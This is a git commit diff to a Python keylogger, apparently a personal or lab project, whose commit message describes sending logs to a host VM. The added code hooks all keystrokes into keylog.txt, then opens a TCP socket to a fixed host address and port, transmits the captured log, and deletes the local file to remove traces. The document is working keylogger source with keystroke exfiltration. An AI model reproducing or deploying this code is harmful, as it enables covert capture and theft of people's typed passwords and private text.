08f0d0c844c93e2438b7389cd5874f2120f9a256
Kavish Shah <kksmisha@gmail.com>
2025-03-21 19:47:46 +0530

    Use of sockets to send files to host VM
    - creates keylog.txt
    - sends it to the host machine
    - deletes the log_file

--- keylogger.py
+++ keylogger.py
@@ -1,8 +1,13 @@
+import os
 import keyboard
+import socket
 from time import strftime
 
 log_file = "keylog.txt"
 combination_keys = set()
+
+SERVER_IP = "192.168.56.1"
+PORT = 5001
 
 
 def log_keys(event):
@@ -26,5 +31,20 @@ def log_keys(event):
         print(f"{timestamp}: Error: {e}")
 
 
-keyboard.hook(log_keys)
-keyboard.wait("esc")
+def send_file():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+        client_socket.connect((SERVER_IP, PORT))
+        print(f"[+] Connected to {SERVER_IP}:{PORT}")
+
+        with open(log_file, "rb") as file:
+            while chunk := file.read(1024):
+                client_socket.send(chunk)
+
+        print(f"[+] File '{log_file}' sent successfully!")
+
+
+if __name__ == "__main__":
+    keyboard.hook(log_keys)
+    keyboard.wait("esc")
+    send_file()
+    os.remove(log_file)
